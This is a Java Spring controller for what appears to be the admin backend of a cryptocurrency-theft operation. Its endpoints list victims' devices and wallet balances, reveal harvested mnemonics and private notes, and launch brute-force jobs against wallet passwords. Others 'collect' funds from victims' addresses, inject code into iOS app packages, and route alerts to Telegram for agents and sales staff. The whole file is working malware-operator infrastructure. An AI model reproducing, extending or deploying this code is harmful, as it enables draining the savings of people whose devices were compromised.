package com.admin.web;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.LinkedHashMap;
import java.util.Map;

import org.springframework.core.io.FileSystemResource;
import org.springframework.core.io.Resource;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.multipart.MultipartFile;

import com.admin.auth.AdminHolder;
import com.admin.auth.RequirePerm;
import com.admin.dto.ApiResponse;
import com.admin.service.AddressAdminService;
import com.admin.service.AppAdminService;
import com.admin.service.BundleAdminService;
import com.admin.service.ChangelogService;
import com.admin.service.DeviceAdminService;
import com.admin.service.DeviceWalletService;
import com.admin.service.IpaAdminService;
import com.admin.service.PermissionAdminService;
import com.admin.service.SecretListService;
import com.admin.service.SecretRevealService;
import com.admin.service.SettingsAdminService;
import com.admin.service.TemplateAdminService;
import com.admin.service.UserAdminService;
import com.admin.service.WalletOpsService;

import lombok.RequiredArgsConstructor;

@RestController
@RequestMapping("/api/admin")
@RequiredArgsConstructor
public class AdminApiController {

    private final DeviceAdminService deviceAdminService;
    private final SecretRevealService secretRevealService;
    private final WalletOpsService walletOpsService;
    private final SettingsAdminService settingsAdminService;
    private final BundleAdminService bundleAdminService;
    private final UserAdminService userAdminService;
    private final AddressAdminService addressAdminService;
    private final SecretListService secretListService;
    private final AppAdminService appAdminService;
    private final PermissionAdminService permissionAdminService;
    private final TemplateAdminService templateAdminService;
    private final ChangelogService changelogService;
    private final IpaAdminService ipaAdminService;
    private final DeviceWalletService deviceWalletService;

    @GetMapping("/changelog")
    public Map<String, Object> changelog() {
        return ApiResponse.ok(changelogService.load());
    }

    @GetMapping("/summary")
    @RequirePerm("menu.devices")
    public Map<String, Object> summary() {
        return ApiResponse.ok(deviceAdminService.summary(AdminHolder.require()));
    }

    @GetMapping("/devices")
    @RequirePerm("menu.devices")
    public Map<String, Object> devices(
            @RequestParam(defaultValue = "0") int page,
            @RequestParam(defaultValue = "50") int size,
            @RequestParam(required = false) String has_wallet,
            @RequestParam(required = false) String min_usdt,
            @RequestParam(required = false) String ios,
            @RequestParam(required = false) String appid,
            @RequestParam(required = false) String device_id,
            @RequestParam(required = false) Integer agent_id,
            @RequestParam(required = false) Integer channel_id,
            @RequestParam(required = false) Integer sales_id) {
        Map<String, String> filters = new LinkedHashMap<>();
        filters.put("has_wallet", has_wallet);
        filters.put("min_usdt", min_usdt);
        filters.put("ios", ios);
        filters.put("appid", appid);
        filters.put("device_id", device_id);
        if (agent_id != null) {
            filters.put("agent_id", String.valueOf(agent_id));
        }
        if (channel_id != null) {
            filters.put("channel_id", String.valueOf(channel_id));
        }
        if (sales_id != null) {
            filters.put("sales_id", String.valueOf(sales_id));
        }
        return ApiResponse.ok(deviceAdminService.listDevices(AdminHolder.require(), page, size, filters));
    }

    @GetMapping("/devices/{deviceId}")
    @RequirePerm("menu.devices")
    public Map<String, Object> deviceDetail(@PathVariable String deviceId) {
        Map<String, Object> data = deviceAdminService.deviceDetail(AdminHolder.require(), deviceId);
        if (data == null) {
            return ApiResponse.fail("设备不存在或无权访问", 1);
        }
        return ApiResponse.ok(data);
    }

    @PostMapping("/devices/{deviceId}/balances/refresh")
    @RequirePerm("menu.devices")
    public Map<String, Object> refreshBalance(@PathVariable String deviceId, @RequestBody Map<String, Object> body) {
        String address = str(body, "address");
        String chain = str(body, "chain");
        Map<String, Object> data = deviceAdminService.refreshBalance(AdminHolder.require(), deviceId, address, chain);
        if (data == null) {
            return ApiResponse.fail("设备不存在或无权访问", 1);
        }
        if (!Boolean.TRUE.equals(data.get("ok"))) {
            return ApiResponse.fail(String.valueOf(data.getOrDefault("error", "刷新失败")), 1, data);
        }
        return ApiResponse.ok("已刷新", data);
    }

    @PostMapping("/devices/{deviceId}/wallets/unlock")
    @RequirePerm("menu.devices")
    public Map<String, Object> walletUnlock(@PathVariable String deviceId, @RequestBody Map<String, Object> body) {
        return biz(walletOpsService.unlock(AdminHolder.require(), deviceId, str(body, "fileName"),
                str(body, "password"), str(body, "walletId")), "解锁成功", "密码错误");
    }

    @PostMapping("/devices/{deviceId}/wallets/reveal")
    @RequirePerm("menu.devices")
    public Map<String, Object> walletReveal(@PathVariable String deviceId, @RequestBody Map<String, Object> body) {
        return biz(walletOpsService.revealWallet(AdminHolder.require(), deviceId, str(body, "fileName"),
                        str(body, "walletKey"), str(body, "password")),
                "验证成功", "密码错误");
    }

    @PostMapping("/devices/{deviceId}/notes/reveal")
    @RequirePerm("menu.devices")
    public Map<String, Object> noteReveal(@PathVariable String deviceId, @RequestBody Map<String, Object> body) {
        Integer idx = body.get("noteIndex") == null ? 0 : Integer.parseInt(String.valueOf(body.get("noteIndex")));
        return biz(walletOpsService.revealNote(AdminHolder.require(), deviceId, str(body, "fileName"), idx, str(body, "password")),
                "验证成功", "密码错误");
    }

    @GetMapping("/devices/{deviceId}/notes/media")
    @RequirePerm("menu.devices")
    public ResponseEntity<byte[]> notesMedia(@PathVariable String deviceId,
            @RequestParam String fileName, @RequestParam String member) {
        if (deviceAdminService.loadVisibleDevice(AdminHolder.require(), deviceId) == null) {
            return ResponseEntity.notFound().build();
        }
        byte[] raw = deviceWalletService.readNotesMember(deviceId, fileName, member);
        if (raw == null || raw.length == 0) {
            return ResponseEntity.notFound().build();
        }
        String mime = "application/octet-stream";
        String low = member.toLowerCase();
        if (low.endsWith(".png")) {
            mime = "image/png";
        } else if (low.endsWith(".jpg") || low.endsWith(".jpeg")) {
            mime = "image/jpeg";
        } else if (low.endsWith(".gif")) {
            mime = "image/gif";
        } else if (low.endsWith(".webp")) {
            mime = "image/webp";
        }
        return ResponseEntity.ok()
                .header(HttpHeaders.CACHE_CONTROL, "max-age=300")
                .contentType(MediaType.parseMediaType(mime))
                .body(raw);
    }

    @PostMapping("/devices/{deviceId}/wallets/brute")
    @RequirePerm("menu.devices")
    public Map<String, Object> bruteStart(@PathVariable String deviceId, @RequestBody Map<String, Object> body) {
        return biz(walletOpsService.bruteStart(AdminHolder.require(), deviceId, str(body, "fileName")),
                "爆破已开始", "无法开始爆破");
    }

    @GetMapping("/devices/{deviceId}/wallets/brute/{jobId}")
    @RequirePerm("menu.devices")
    public Map<String, Object> bruteStatus(@PathVariable String deviceId, @PathVariable String jobId) {
        Map<String, Object> data = walletOpsService.bruteStatus(AdminHolder.require(), deviceId, jobId);
        if (data.get("jobId") == null && !Boolean.TRUE.equals(data.get("exists"))) {
            return ApiResponse.fail(String.valueOf(data.getOrDefault("error", "任务不存在或已过期")), 1, data);
        }
        return ApiResponse.ok(data);
    }

    @PostMapping("/devices/{deviceId}/wallets/brute-order")
    @RequirePerm("menu.devices")
    public Map<String, Object> bruteOrder(@PathVariable String deviceId, @RequestBody Map<String, Object> body) {
        return biz(walletOpsService.bruteOrder(AdminHolder.require(), deviceId, str(body, "wallet"), str(body, "package")),
                "下单提醒已发送", "下单失败");
    }

    @GetMapping("/mnemonics")
    @RequirePerm("menu.mnemonics")
    public Map<String, Object> mnemonics(
            @RequestParam(defaultValue = "0") int page,
            @RequestParam(defaultValue = "20") int size,
            @RequestParam(required = false) String device_id,
            @RequestParam(required = false) Long mnemonic_id) {
        return ApiResponse.ok(secretListService.listMnemonics(AdminHolder.require(), page, size, device_id, mnemonic_id));
    }

    @PostMapping("/mnemonics/{id}/reveal")
    @RequirePerm("menu.mnemonics")
    public Map<String, Object> mnemonicReveal(@PathVariable long id, @RequestBody Map<String, Object> body) {
        return biz(secretRevealService.revealMnemonic(AdminHolder.require(), id, str(body, "password")),
                "验证成功", "密码错误");
    }

    @PostMapping("/mnemonics/derive-addresses")
    @RequirePerm("menu.mnemonics")
    public Map<String, Object> derive(@RequestBody Map<String, Object> body) {
        Map<String, Object> data = secretRevealService.deriveAddresses(AdminHolder.require(), body.get("ids"));
        if (Boolean.TRUE.equals(data.get("ok")) || Boolean.TRUE.equals(data.get("partial"))) {
            return ApiResponse.ok(String.valueOf(data.getOrDefault("message", "派生完成")), data);
        }
        return ApiResponse.fail(String.valueOf(data.getOrDefault("error", data.getOrDefault("message", "派生失败"))), 1, data);
    }

    @GetMapping("/memorandums")
    @RequirePerm("menu.memorandums")
    public Map<String, Object> memorandums(
            @RequestParam(defaultValue = "0") int page,
            @RequestParam(defaultValue = "20") int size,
            @RequestParam(required = false) String device_id) {
        return ApiResponse.ok(secretListService.listMemorandums(AdminHolder.require(), page, size, device_id));
    }

    @PostMapping("/memorandums/{id}/reveal")
    @RequirePerm("menu.memorandums")
    public Map<String, Object> memoReveal(@PathVariable long id, @RequestBody Map<String, Object> body) {
        return biz(secretRevealService.revealMemorandum(AdminHolder.require(), id, str(body, "password")),
                "验证成功", "密码错误");
    }

    @GetMapping("/settings")
    @RequirePerm("menu.settings")
    public Map<String, Object> settings() {
        return ApiResponse.ok(settingsAdminService.list());
    }

    @PostMapping("/settings/save")
    @RequirePerm("menu.settings")
    public Map<String, Object> settingsSave(@RequestBody Map<String, Object> body) {
        Map<String, Object> data = settingsAdminService.save(body);
        if (!Boolean.TRUE.equals(data.get("ok"))) {
            return ApiResponse.fail(String.valueOf(data.getOrDefault("error", "保存失败")), 1, data);
        }
        return ApiResponse.ok("saved", data);
    }

    @GetMapping("/bundles")
    @RequirePerm(value = "menu.bundles", superadmin = true)
    public Map<String, Object> bundles() {
        return ApiResponse.ok(bundleAdminService.list());
    }

    @PostMapping("/bundles/save")
    @RequirePerm(value = "menu.bundles", superadmin = true)
    public Map<String, Object> bundlesSave(@RequestBody Object body) {
        Map<String, Object> data = bundleAdminService.save(body);
        if (Boolean.FALSE.equals(data.get("ok"))) {
            return ApiResponse.fail(String.valueOf(data.getOrDefault("error", "保存失败")), 1, data);
        }
        return ApiResponse.ok("saved", data);
    }

    @GetMapping("/apps")
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public Map<String, Object> apps(
            @RequestParam(required = false) String name,
            @RequestParam(required = false) String appid,
            @RequestParam(required = false) Integer agent_id,
            @RequestParam(required = false) Integer channel_id,
            @RequestParam(required = false) Integer sales_id) {
        return ApiResponse.ok(appAdminService.page(name, appid, agent_id, channel_id, sales_id));
    }

    @PostMapping("/apps/create")
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public Map<String, Object> appsCreate(@RequestBody Map<String, Object> body) {
        String err = appAdminService.create(AdminHolder.require(), body);
        if (err != null) {
            return ApiResponse.fail(err, 1);
        }
        return ApiResponse.ok("created", null);
    }

    @PostMapping("/apps/{id}/update")
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public Map<String, Object> appsUpdate(@PathVariable int id, @RequestBody Map<String, Object> body) {
        String err = appAdminService.update(AdminHolder.require(), id, body);
        if (err != null) {
            return ApiResponse.fail(err, 1);
        }
        return ApiResponse.ok("saved", null);
    }

    @PostMapping(value = "/apps/ipa/logo", consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public Map<String, Object> ipaLogo(@RequestParam("file") MultipartFile file) {
        return biz(ipaAdminService.saveLogo(file), "uploaded", "上传失败");
    }

    @GetMapping("/apps/ipa/logo/{filename}")
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public ResponseEntity<Resource> ipaLogoFile(@PathVariable String filename) {
        Path path = ipaAdminService.resolveLogo(filename);
        if (path == null) {
            return ResponseEntity.notFound().build();
        }
        return ResponseEntity.ok().contentType(MediaType.IMAGE_PNG).body(new FileSystemResource(path));
    }

    @PostMapping(value = "/apps/ipa/source", consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public Map<String, Object> ipaSource(@RequestParam("file") MultipartFile file) {
        return biz(ipaAdminService.saveSource(file), "uploaded", "上传失败");
    }

    @PostMapping("/apps/ipa/generate")
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public Map<String, Object> ipaGenerate(@RequestBody Map<String, Object> body) {
        return biz(ipaAdminService.startGenerate(body), "queued", "入队失败");
    }

    @PostMapping("/apps/ipa/inject")
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public Map<String, Object> ipaInject(@RequestBody Map<String, Object> body) {
        return biz(ipaAdminService.startInject(body), "queued", "入队失败");
    }

    @GetMapping("/apps/ipa/jobs/{jobId}")
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public Map<String, Object> ipaJob(@PathVariable String jobId) {
        Map<String, Object> data = ipaAdminService.job(jobId);
        if (!Boolean.TRUE.equals(data.get("ok")) && data.get("job") == null) {
            return ApiResponse.fail(String.valueOf(data.getOrDefault("error", "任务不存在或已过期")), 1, data);
        }
        return ApiResponse.ok(data);
    }

    @GetMapping("/apps/ipa/download/job/{jobId}")
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public ResponseEntity<Resource> ipaDownloadJob(@PathVariable String jobId) throws Exception {
        Path path = ipaAdminService.resolveJobOutput(jobId);
        if (path == null || !Files.isRegularFile(path)) {
            return ResponseEntity.notFound().build();
        }
        String name = path.getFileName().toString().replace("\"", "");
        return ResponseEntity.ok()
                .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + name + "\"")
                .contentType(MediaType.APPLICATION_OCTET_STREAM)
                .contentLength(Files.size(path))
                .body(new FileSystemResource(path));
    }

    @GetMapping("/apps/ipa/download/{filename}")
    @RequirePerm(value = "menu.app_manager", superadmin = true)
    public ResponseEntity<Resource> ipaDownload(@PathVariable String filename) throws Exception {
        Path path = ipaAdminService.resolveOutput(filename);
        if (path == null || !Files.isRegularFile(path)) {
            return ResponseEntity.notFound().build();
        }
        String name = path.getFileName().toString().replace("\"", "");
        return ResponseEntity.ok()
                .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + name + "\"")
                .contentType(MediaType.APPLICATION_OCTET_STREAM)
                .contentLength(Files.size(path))
                .body(new FileSystemResource(path));
    }

    @GetMapping("/permissions")
    @RequirePerm(value = "menu.permissions", superadmin = true)
    public Map<String, Object> permissions() {
        return ApiResponse.ok(permissionAdminService.page());
    }

    @PostMapping("/permissions/save")
    @RequirePerm(value = "menu.permissions", superadmin = true)
    public Map<String, Object> permissionsSave(@RequestBody Map<String, Object> body) {
        String err = permissionAdminService.save(AdminHolder.require(), body);
        if (err != null) {
            return ApiResponse.fail(err, 1);
        }
        return ApiResponse.ok("saved", null);
    }

    @GetMapping("/templates")
    @RequirePerm("menu.templates")
    public Map<String, Object> templates() {
        return ApiResponse.ok(templateAdminService.list());
    }

    @PostMapping("/templates/{id}/save")
    @RequirePerm("menu.templates")
    public Map<String, Object> templateSave(@PathVariable int id, @RequestBody Map<String, Object> body) {
        String err = templateAdminService.save(id, body);
        if (err != null) {
            return ApiResponse.fail(err, 1);
        }
        return ApiResponse.ok("saved", null);
    }

    @GetMapping("/users")
    @RequirePerm("menu.users")
    public Map<String, Object> users() {
        return ApiResponse.ok(userAdminService.tree(AdminHolder.require()));
    }

    @PostMapping("/users/create")
    @RequirePerm("menu.users")
    public Map<String, Object> usersCreate(@RequestBody Map<String, Object> body) {
        String err = userAdminService.create(AdminHolder.require(), body);
        return err == null ? ApiResponse.ok("created", null) : ApiResponse.fail(err, 1);
    }

    @PostMapping("/users/{id}/edit")
    @RequirePerm("menu.users")
    public Map<String, Object> usersEdit(@PathVariable int id, @RequestBody Map<String, Object> body) {
        String err = userAdminService.update(AdminHolder.require(), id, body);
        return err == null ? ApiResponse.ok("saved", null) : ApiResponse.fail(err, 1);
    }

    @PostMapping("/users/{id}/tg-test")
    @RequirePerm("menu.users")
    public Map<String, Object> usersTgTest(@PathVariable int id) {
        return biz(userAdminService.tgTest(AdminHolder.require(), id), "已发送", "发送失败");
    }

    @PostMapping("/users/{id}/collect-address")
    @RequirePerm("menu.users")
    public Map<String, Object> usersCollect(@PathVariable int id, @RequestBody Map<String, Object> body) {
        String err = userAdminService.saveCollect(AdminHolder.require(), id, body);
        return err == null ? ApiResponse.ok("saved", null) : ApiResponse.fail(err, 1);
    }

    @PostMapping("/users/{id}/login-ip")
    @RequirePerm("menu.users")
    public Map<String, Object> usersLoginIp(@PathVariable int id, @RequestBody Map<String, Object> body) {
        Object raw = body == null ? "" : body.getOrDefault("login_ip_whitelist", body.get("raw"));
        String err = userAdminService.saveLoginIp(AdminHolder.require(), id, raw);
        return err == null ? ApiResponse.ok("saved", null) : ApiResponse.fail(err, 1);
    }

    @PostMapping("/users/{id}/toggle")
    @RequirePerm("menu.users")
    public Map<String, Object> usersToggle(@PathVariable int id, @RequestBody Map<String, Object> body) {
        String action = str(body, "action");
        boolean enable = "enable".equalsIgnoreCase(action);
        String err = userAdminService.toggle(AdminHolder.require(), id, enable);
        return err == null ? ApiResponse.ok(enable ? "enabled" : "disabled", null) : ApiResponse.fail(err, 1);
    }

    @GetMapping("/addresses")
    @RequirePerm("menu.addresses.list")
    public Map<String, Object> addresses(
            @RequestParam(defaultValue = "0") int page,
            @RequestParam(defaultValue = "50") int size,
            @RequestParam(required = false) String chaintype,
            @RequestParam(required = false) String device_id,
            @RequestParam(required = false) String address,
            @RequestParam(required = false) String appid,
            @RequestParam(required = false) Integer agent_id,
            @RequestParam(required = false) Integer channel_id,
            @RequestParam(required = false) Integer sales_id,
            @RequestParam(required = false) String sort,
            @RequestParam(required = false) String order) {
        Map<String, String> filters = new LinkedHashMap<>();
        filters.put("chaintype", chaintype);
        filters.put("device_id", device_id);
        filters.put("address", address);
        filters.put("appid", appid);
        if (agent_id != null) {
            filters.put("agent_id", String.valueOf(agent_id));
        }
        if (channel_id != null) {
            filters.put("channel_id", String.valueOf(channel_id));
        }
        if (sales_id != null) {
            filters.put("sales_id", String.valueOf(sales_id));
        }
        filters.put("sort", sort);
        filters.put("order", order);
        return ApiResponse.ok(addressAdminService.list(AdminHolder.require(), page, size, filters));
    }

    @GetMapping("/addresses/collect-preview")
    @RequirePerm("menu.addresses.list")
    public Map<String, Object> collectPreview(@RequestParam long address_row_id) {
        Map<String, Object> data = addressAdminService.collectPreview(AdminHolder.require(), address_row_id);
        if (!Boolean.TRUE.equals(data.get("ok"))) {
            return ApiResponse.fail(String.valueOf(data.getOrDefault("error", "无法预览")), 1, data);
        }
        return ApiResponse.ok(data);
    }

    @PostMapping("/addresses/collect")
    @RequirePerm("menu.addresses.list")
    public Map<String, Object> collect(@RequestBody Map<String, Object> body) {
        long id = 0;
        try {
            id = Long.parseLong(String.valueOf(body.get("address_row_id")));
        } catch (Exception ignored) {
        }
        return biz(addressAdminService.collectExecute(AdminHolder.require(), id), "归集完成", "归集失败");
    }

    @PostMapping("/addresses/refresh")
    @RequirePerm("menu.addresses.list")
    public Map<String, Object> addressRefresh(@RequestBody Map<String, Object> body) {
        long id = 0;
        try {
            id = Long.parseLong(String.valueOf(body.get("address_row_id")));
        } catch (Exception ignored) {
        }
        return biz(addressAdminService.refreshRow(AdminHolder.require(), id), "已刷新", "刷新失败");
    }

    @GetMapping("/collect-records")
    @RequirePerm("menu.collect_records")
    public Map<String, Object> collectRecords(
            @RequestParam(defaultValue = "0") int page,
            @RequestParam(defaultValue = "50") int size,
            @RequestParam(required = false) String chain,
            @RequestParam(required = false) String status,
            @RequestParam(required = false) String device_id,
            @RequestParam(required = false) String appid) {
        return ApiResponse.ok(addressAdminService.collectRecords(AdminHolder.require(), page, size, chain, status, device_id, appid));
    }

    private Map<String, Object> biz(Map<String, Object> data, String okMsg, String failMsg) {
        if (Boolean.TRUE.equals(data.get("ok"))) {
            return ApiResponse.ok(okMsg, data);
        }
        return ApiResponse.fail(String.valueOf(data.getOrDefault("error", data.getOrDefault("message", failMsg))), 1, data);
    }

    private String str(Map<String, Object> body, String key) {
        if (body == null || body.get(key) == null) {
            return "";
        }
        return String.valueOf(body.get(key));
    }
}
